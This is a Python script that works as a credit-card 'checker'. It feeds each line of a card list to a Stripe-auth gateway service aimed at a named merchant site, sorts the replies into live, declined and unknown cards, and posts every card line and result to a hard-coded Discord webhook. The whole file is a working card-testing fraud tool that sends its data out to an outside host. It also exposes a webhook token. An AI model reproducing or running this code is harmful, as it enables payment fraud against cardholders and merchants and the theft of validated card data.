import requests
import json
import urllib.parse
import time

INPUT_FILE = "list.txt"
BASE_URL = "https://titanautostripeauth.onrender.com/gateway=titanautostripe/key=titanfuryy/site=dilaboards.com/cc="
WEBHOOK_URL = "https://discord.com/api/webhooks/1443879354420559902/YkR6tWOSeIB8bl1XlqV6rGjA4eb9b8PQcX7rywqEjqOIgmIPIZ2rcIhWxjyaq3ECILDM"

approved = []
declined = []
unknown = []
errors = []


def send_embed(title, description, color):
    payload = {
        "embeds": [
            {
                "title": title,
                "description": description[:4090],
                "color": color,
                "footer": {"text": "String Logger"}
            }
        ]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass


def classify_by_status(status, message):
    status = str(status).lower()
    message = str(message).lower()

    if status in ["approved", "success", "live"]:
        return "approved"
    if status in ["declined", "dead"]:
        return "declined"

    if any(w in message for w in ["approved", "success", "charged", "live"]):
        return "approved"
    if any(w in message for w in ["declined", "dead", "incorrect", "expired", "cvc", "cvv", "blocked"]):
        return "declined"

    return "unknown"


with open(INPUT_FILE, "r", encoding="utf-8") as f:
    lines = f.read().splitlines()

send_embed("Checker Started", "Checking started…", 3447003)


for index, line in enumerate(lines, start=1):
    if not line.strip():
        continue

    url = BASE_URL + urllib.parse.quote(line)

    try:
        r = requests.get(url, timeout=30)
        data = r.json()

        # ✅ Read new format
        response_msg = data.get("response")
        status = data.get("status")

        # ✅ Fallback old format
        if not response_msg:
            resp_obj = data.get("Response", {})
            response_msg = resp_obj.get("message") or resp_obj.get("raw_response") or "No message"
            status = status or resp_obj.get("status") or "Unknown"

        # ✅ Classification
        category = classify_by_status(status, response_msg)

        # ✅ DISPLAY STRING + RESPONSE + STATUS
        record = (
            f"string `{line}`\n"
            f"response {response_msg}\n"
            f"status {status}"
        )

        if category == "approved":
            approved.append(record)
            send_embed("✅ APPROVED", record, 3066993)

        elif category == "declined":
            declined.append(record)
            send_embed("❌ DECLINED", record, 15158332)

        else:
            unknown.append(record)
            send_embed("⚠ UNKNOWN", record, 15844367)

        print(f"[{index}] {category.upper()} -> {response_msg}")

        # Delay handling
        if "too many requests" in str(response_msg).lower():
            time.sleep(5)
        else:
            time.sleep(2.5)

    except json.JSONDecodeError:
        record = f"string `{line}`\nresponse Invalid JSON\nstatus Error"
        errors.append(record)
        send_embed("🚫 ERROR", record, 9807270)
        time.sleep(3)

    except Exception as e:
        record = f"string `{line}`\nresponse {str(e)}\nstatus Error"
        errors.append(record)
        send_embed("🚫 ERROR", record, 9807270)
        time.sleep(3)


# Save results
open("approved.txt", "w", encoding="utf-8").write("\n".join(approved))
open("declined.txt", "w", encoding="utf-8").write("\n".join(declined))
open("unknown.txt", "w", encoding="utf-8").write("\n".join(unknown))
open("error.txt", "w", encoding="utf-8").write("\n".join(errors))


# Final summary
summary = (
    f"✅ Approved: {len(approved)}\n"
    f"❌ Declined: {len(declined)}\n"
    f"⚠ Unknown: {len(unknown)}\n"
    f"🚫 Errors: {len(errors)}"
)

send_embed("Finished Checking", summary, 5763719)
print("\n✅ DONE CHECKING")
print(summary)
